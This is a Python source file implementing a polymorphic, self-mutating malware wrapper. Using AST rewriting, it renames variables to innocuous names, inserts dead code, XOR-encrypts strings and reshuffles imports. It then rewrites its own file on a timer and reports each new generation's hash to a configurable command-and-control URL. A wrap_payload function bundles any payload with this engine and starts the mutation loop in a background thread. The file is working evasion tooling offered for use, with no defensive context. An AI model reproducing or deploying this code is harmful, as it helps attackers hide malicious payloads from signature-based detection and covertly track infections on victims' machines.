import ast, os, sys, random, string, hashlib, tempfile, time, json, copy
try:
    import urllib.request
except ImportError:
    urllib = None

_GEN = 0
_MUTATE_INTERVAL = 14400
_C2_REPORT_URL = None
_PROTECTED = {'self','cls','True','False','None','__name__','__main__','__file__','__init__','__doc__','int','str','float','bool','list','dict','set','tuple','bytes','bytearray','print','len','range','open','isinstance','hasattr','getattr','chr','ord','hex','max','min','sum','any','all','sorted','map','filter','zip','enumerate','hash','dir','exec','eval','compile','format','Exception','ValueError','TypeError','KeyError','IndexError','OSError','os','sys','json','ast','random','string','hashlib','tempfile','time','copy','socket','struct','threading','subprocess','signal','re','io','base64','urllib','http','ssl','logging','collections','itertools','functools','pathlib','encode','decode','append','extend','join','split','replace','strip','read','write','close','connect','send','recv','sendall'}
_VARPOOL = ['buffer_size','conn_handle','temp_data','chunk_size','retry_count','max_retries','timeout_ms','response_code','packet_len','header_data','payload_buf','sock_fd','addr_info','port_num','host_addr','read_bytes','write_buf','file_handle','config_path','log_level','worker_id','thread_count','queue_size','pool_size','batch_count','interval_sec','delay_ms','start_time','end_time','elapsed_ms','status_code','error_msg','result_data','output_buf','input_data','session_id','token_str','auth_header','api_key','secret_key','cipher_text','plain_text','hash_val','digest_hex','nonce_bytes','salt_data','iv_bytes','key_material','block_size','round_key','offset_val','base_addr','page_size','alloc_size','ref_count','node_ptr','next_node','head_ptr','tail_ptr','cache_hits','frame_data','channel_id','sample_rate','metadata_buf','field_name','record_id','row_count','cell_val','table_name','query_str','cursor_obj','lock_handle','signal_num','callback_fn','event_type','state_val','action_type','filter_fn','accumulator','range_start','range_end','threshold_val','limit_val','process_id','exit_code','flags_val','mode_bits','path_str','dir_name','version_str','source_path','dest_path','seq_num','window_size','ttl_val','bandwidth_bps','latency_ms','cpu_pct','mem_usage','disk_usage']
_DEAD = ['_ref=0','_buf=None','_ok=True','_cfg={}','_init=type(None)','_tmp=bytearray(0)','_n=0;_n+=0','_s=set()','_chk=len(b"")','_z=bytes(1)']

class _Renamer(ast.NodeTransformer):
    def __init__(self):
        self.m = {}
        self._d = set()
        self._i = set()
        self._p = list(_VARPOOL)
        random.shuffle(self._p)
        self._pi = 0
    def _pick(self):
        if self._pi < len(self._p):
            n = self._p[self._pi]
            self._pi += 1
            return n
        return f'_v{random.randint(0,9999)}'
    def _collect(self, tree):
        for nd in ast.walk(tree):
            if isinstance(nd, (ast.Import, ast.ImportFrom)):
                for a in nd.names:
                    self._i.add(a.asname or a.name)
                    for p in a.name.split('.'): self._i.add(p)
                    if isinstance(nd, ast.ImportFrom) and nd.module:
                        for p in nd.module.split('.'): self._i.add(p)
            elif isinstance(nd, (ast.FunctionDef, ast.AsyncFunctionDef)):
                self._d.add(nd.name)
                for a in nd.args.args + nd.args.posonlyargs + nd.args.kwonlyargs: self._d.add(a.arg)
                if nd.args.vararg: self._d.add(nd.args.vararg.arg)
                if nd.args.kwarg: self._d.add(nd.args.kwarg.arg)
            elif isinstance(nd, ast.Name) and isinstance(nd.ctx, (ast.Store, ast.Del)): self._d.add(nd.id)
        for n in sorted(self._d - self._i - _PROTECTED):
            if not n.startswith('__') and not n.startswith('_d'): self.m[n] = self._pick()
    def _r(self, n): return self.m.get(n, n)
    def visit_FunctionDef(self, nd):
        nd.name = self._r(nd.name)
        for a in nd.args.args + nd.args.posonlyargs + nd.args.kwonlyargs: a.arg = self._r(a.arg)
        if nd.args.vararg: nd.args.vararg.arg = self._r(nd.args.vararg.arg)
        if nd.args.kwarg: nd.args.kwarg.arg = self._r(nd.args.kwarg.arg)
        self.generic_visit(nd); return nd
    visit_AsyncFunctionDef = visit_FunctionDef
    def visit_Name(self, nd): nd.id = self._r(nd.id); return nd
    def visit_ExceptHandler(self, nd):
        if nd.name: nd.name = self._r(nd.name)
        self.generic_visit(nd); return nd
    def visit_Global(self, nd): nd.names = [self._r(n) for n in nd.names]; return nd
    def visit_Nonlocal(self, nd): nd.names = [self._r(n) for n in nd.names]; return nd
    def run(self, tree):
        tree = copy.deepcopy(tree)
        self._collect(tree)
        return self.visit(tree)

def _op_dead(tree):
    tree = copy.deepcopy(tree)
    new_body = []
    for s in tree.body:
        new_body.append(s)
        if random.random() < 0.15:
            try: new_body.extend(ast.parse(random.choice(_DEAD)).body)
            except: pass
    tree.body = new_body
    return tree

def _op_str_enc(tree):
    tree = copy.deepcopy(tree)
    enc_any = [False]
    class V(ast.NodeTransformer):
        def visit_Constant(self, nd):
            if isinstance(nd.value, str) and 2 <= len(nd.value) <= 200 and random.random() < 0.5:
                enc_any[0] = True
                k = os.urandom(8)
                e = bytes(b ^ k[i % 8] for i, b in enumerate(nd.value.encode('utf-8')))
                return ast.Call(func=ast.Name(id='_d', ctx=ast.Load()), args=[ast.Constant(value=e), ast.Constant(value=k)], keywords=[])
            return nd
        def visit_JoinedStr(self, nd): return nd
    tree = V().visit(tree)
    if enc_any[0]:
        dec = ast.parse('def _d(_e,_k):\n    return bytes(_e[i]^_k[i%len(_k)] for i in range(len(_e))).decode("utf-8")').body[0]
        idx = 0
        for i, s in enumerate(tree.body):
            if isinstance(s, (ast.Import, ast.ImportFrom)): idx = i + 1
            elif isinstance(s, ast.Expr) and isinstance(getattr(s,'value',None), ast.Constant): idx = i + 1
            else: break
        tree.body.insert(idx, dec)
    ast.fix_missing_locations(tree)
    return tree

def _op_imports(tree):
    tree = copy.deepcopy(tree)
    imps, froms, rest = [], [], []
    for s in tree.body:
        if isinstance(s, ast.Import): imps.append(s)
        elif isinstance(s, ast.ImportFrom): froms.append(s)
        else: rest.append(s)
    random.shuffle(imps)
    random.shuffle(froms)
    for i in imps:
        for a in i.names:
            if not a.asname and random.random() < 0.3:
                a.asname = f'_{a.name.split(".")[-1]}_mod'
    tree.body = imps + froms + rest
    ast.fix_missing_locations(tree)
    return tree

def _self_mutate():
    global _GEN
    my_path = os.path.abspath(sys.modules[__name__].__file__ if hasattr(sys.modules.get(__name__,None),'__file__') else __file__)
    with open(my_path, 'r') as f:
        source = f.read()
    try:
        tree = ast.parse(source)
    except SyntaxError:
        return
    ops = [lambda t: _Renamer().run(t), _op_dead, _op_str_enc, _op_imports]
    random.shuffle(ops)
    for op in ops[:random.randint(2, 4)]:
        try: tree = op(tree)
        except: pass
    try:
        new_source = ast.unparse(tree)
    except:
        return
    _GEN += 1
    gen_line = f'# gen:{_GEN}'
    new_source = gen_line + '\n' + new_source
    try:
        compile(new_source, '<selfmutate>', 'exec')
    except SyntaxError:
        return
    fd, tmp = tempfile.mkstemp(dir=os.path.dirname(my_path) or '.')
    try:
        with os.fdopen(fd, 'w') as f:
            f.write(new_source)
        os.replace(tmp, my_path)
    except:
        try: os.unlink(tmp)
        except: pass
        return
    new_hash = hashlib.sha256(new_source.encode()).hexdigest()
    if _C2_REPORT_URL and urllib:
        try:
            data = json.dumps({'gen': _GEN, 'hash': new_hash, 'size': len(new_source)}).encode()
            req = urllib.request.Request(_C2_REPORT_URL, data=data, headers={'Content-Type': 'application/json'})
            urllib.request.urlopen(req, timeout=5)
        except: pass

def _mutation_loop(interval=None):
    iv = interval or _MUTATE_INTERVAL
    while True:
        time.sleep(iv)
        _self_mutate()

def wrap_payload(payload_code, c2_url=None, interval=14400):
    import inspect
    wrapper_src = inspect.getsource(sys.modules[__name__])
    if c2_url:
        wrapper_src = wrapper_src.replace('_C2_REPORT_URL = None', f'_C2_REPORT_URL = "{c2_url}"')
    wrapper_src = wrapper_src.replace('_MUTATE_INTERVAL = 14400', f'_MUTATE_INTERVAL = {interval}')
    combined = wrapper_src + '\n\n' + payload_code + '\n\nimport threading\nthreading.Thread(target=_mutation_loop, daemon=True).start()\n'
    return combined
